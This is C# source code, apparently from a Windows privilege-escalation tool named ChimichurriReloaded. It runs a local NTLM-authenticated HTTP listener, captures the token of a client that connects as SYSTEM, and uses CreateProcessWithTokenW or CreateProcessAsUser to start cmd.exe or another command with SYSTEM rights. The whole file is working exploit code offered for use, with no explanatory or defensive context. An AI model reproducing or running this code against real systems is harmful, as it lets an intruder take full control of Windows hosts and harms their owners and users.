using System;
using System.Net;
using System.Security.Principal;
using System.Runtime.InteropServices;

namespace ChimichurriReloaded
{
    class HttpImpersonator
    {
        private static bool listening = true;
        private static string port;
        private static string cmd;
        private static string cmdLine;
        private static bool createProcessAsUser;

        public HttpImpersonator(string listeningPort = "9876", string command = @"C:\windows\system32\cmd.exe", string arguments = "", bool asUser = false)
        {
            port = listeningPort;
            cmd = command;
            cmdLine = arguments;
            createProcessAsUser = asUser;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessWithTokenW(
            IntPtr hToken,
            UInt32 dwLogonFlags,
            IntPtr lpApplicationName,
            IntPtr lpCommandLine,
            UInt32 dwCreationFlags,
            IntPtr lpEnvironment,
            IntPtr lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessAsUser(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            int ImpersonationLevel,
            int TokenType,
            out IntPtr phNewToken);

        [DllImport("kernel32.dll")]
        private static extern uint GetLastError();

        private void ProcessRequest(HttpListener listener)
        {
            HttpListenerContext context = listener.GetContext();

            // Get identity object of user who connected to web server
            WindowsIdentity identity = (WindowsIdentity)context.User.Identity;

            // If SYSTEM, use token to CreateProcessWithToken
            if (identity.Name.Equals("NT AUTHORITY\\SYSTEM"))
            {
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                
                if (createProcessAsUser)
                {
                    IntPtr duplicateTokenHandle = IntPtr.Zero;
                    DuplicateTokenEx(identity.Token, 0xf01ff, IntPtr.Zero, 3, 1, out duplicateTokenHandle);
                    if(CreateProcessAsUser(duplicateTokenHandle, cmd, cmdLine, IntPtr.Zero, IntPtr.Zero, true, 0x00000010, IntPtr.Zero, @"C:\", ref si, out pi))
                    {
                        Console.WriteLine("[+] Process spawned with duplicated token...");
                        listening = false;
                    }
                    else
                    {
                        Console.WriteLine("[!] Failed to spawn process duplicated token...");
                        Console.WriteLine("Error Code: " + GetLastError());
                    }
                }
                else
                {
                    IntPtr applicationName = Marshal.StringToHGlobalUni(cmd);
                    IntPtr commandLine = Marshal.StringToHGlobalUni(cmdLine);
                    if (CreateProcessWithTokenW(identity.Token, 0x00000001, applicationName, commandLine, 0, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
                    {
                        Console.WriteLine("[+] Process spawned with impersonated token...");
                        listening = false;
                    }
                    else
                    {
                        Console.WriteLine("[!] Failed to spawn process with impersonated token...");
                        Console.WriteLine("Error Code: " + GetLastError());
                    }
                }
            }

            HttpListenerResponse response = context.Response;

            response.StatusCode = 403;
            response.Close();

        }
        public void Start()
        {
            string prefix = string.Format("http://localhost:{0}/", port);

            HttpListener listener = new HttpListener();
            listener.Prefixes.Add(prefix);
            listener.AuthenticationSchemes = AuthenticationSchemes.Ntlm;
            listener.Start();

            while (listening)
            {
                ProcessRequest(listener);
            }
            listener.Stop();
        }
    }
}
